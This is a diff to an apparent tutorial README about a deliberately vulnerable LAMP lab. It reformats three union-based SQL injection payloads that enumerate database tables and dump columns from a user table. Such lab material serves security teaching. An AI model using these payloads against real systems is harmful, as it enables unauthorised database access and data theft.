@@ -99,10 +99,9 @@ Setting up LAMP(Linux, Apache, Mysql, PHP):-
     and can be hackable.
    Now type some queries given below:-
 
-   1. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables;#
+   1. ```a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables;#```
 
-   2. a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables 
-      where table_name like 'user%';#
+   2. ```a' and 1=0 union select table_name, table_schema, table_type, table_catalog from information_schema.tables where table_name like 'user%';#```
 
-   3. a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#
+   3. ```a' and 1=0 union select concat_WS(':', name), concat_WS(':', srno, city), name, city from user;#```
     
